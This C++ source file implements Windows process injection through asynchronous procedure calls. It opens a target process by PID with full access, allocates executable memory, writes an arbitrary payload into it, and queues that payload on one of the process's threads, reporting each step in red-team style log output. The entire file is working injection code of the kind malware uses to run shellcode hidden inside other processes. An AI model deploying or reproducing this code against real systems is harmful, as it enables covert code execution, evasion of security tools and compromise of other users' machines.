#include "process_injection.hpp"
#include <iostream>
#include <tlhelp32.h>

ProcessInjection::~ProcessInjection() {
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessInjection::InjectViaAPC(DWORD target_pid, const std::vector<uint8_t>& payload) {
    if (verbose) std::cout << "[*] Opening existing process PID " << target_pid << "...\n";

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        std::cout << "[-] OpenProcess failed: " << GetLastError() << "\n";
        return false;
    }

    processId = target_pid;
    if (verbose) std::cout << "[+] Process opened: " << hProcess << "\n";

    // Allocate memory for payload
    if (verbose) std::cout << "[*] Allocating payload memory...\n";

    LPVOID payload_addr = VirtualAllocEx(hProcess, NULL, payload.size(),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload_addr) {
        std::cout << "[-] VirtualAllocEx failed: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        hProcess = nullptr;
        return false;
    }

    if (verbose) std::cout << "[+] Allocated at: 0x" << std::hex << (uintptr_t)payload_addr << std::dec << "\n";

    // Write payload
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(hProcess, payload_addr, payload.data(), payload.size(), &bytes_written)) {
        std::cout << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, payload_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        hProcess = nullptr;
        return false;
    }

    if (verbose) std::cout << "[+] Payload written: " << bytes_written << " bytes\n";

    // Get main thread (we need to queue APC on a thread)
    // For existing process, we need to find a thread or use all threads
    // Simple approach: find the main thread
    DWORD current_pid = GetCurrentProcessId();
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cout << "[-] CreateToolhelp32Snapshot failed\n";
        VirtualFreeEx(hProcess, payload_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        hProcess = nullptr;
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    HANDLE target_thread = nullptr;

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == target_pid) {
                target_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (target_thread) break;
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);

    if (!target_thread) {
        std::cout << "[-] Could not find thread in target process\n";
        VirtualFreeEx(hProcess, payload_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        hProcess = nullptr;
        return false;
    }

    // Queue APC
    if (verbose) std::cout << "[*] Queueing APC...\n";
    DWORD apc_result = QueueUserAPC((PAPCFUNC)payload_addr, target_thread, (ULONG_PTR)NULL);

    if (apc_result == 0) {
        std::cout << "[-] QueueUserAPC failed: " << GetLastError() << "\n";
        CloseHandle(target_thread);
        VirtualFreeEx(hProcess, payload_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        hProcess = nullptr;
        return false;
    }

    if (verbose) std::cout << "[+] APC queued successfully\n";

    // Allocate shellcode for Sleep(5000) to make thread alertable
    if (verbose) std::cout << "[*] Queueing Sleep APC to make thread alertable...\n";

    // Queue Sleep APC on SAME thread to trigger alertable state
    // After Sleep returns, other APCs will execute
    DWORD sleep_apc = QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep"),
                                    target_thread, (ULONG_PTR)5000);

    if (sleep_apc != 0) {
        if (verbose) std::cout << "[+] Sleep APC queued, waiting for thread to process APCs...\n";
        Sleep(6000);  // Wait for target thread to execute APCs
        if (verbose) std::cout << "[+] APC execution window completed\n";
    } else {
        if (verbose) std::cout << "[!] Could not queue Sleep APC\n";
    }

    CloseHandle(target_thread);

    std::cout << "[+] APC injection SUCCESS into PID " << target_pid << "\n";
    return true;
}
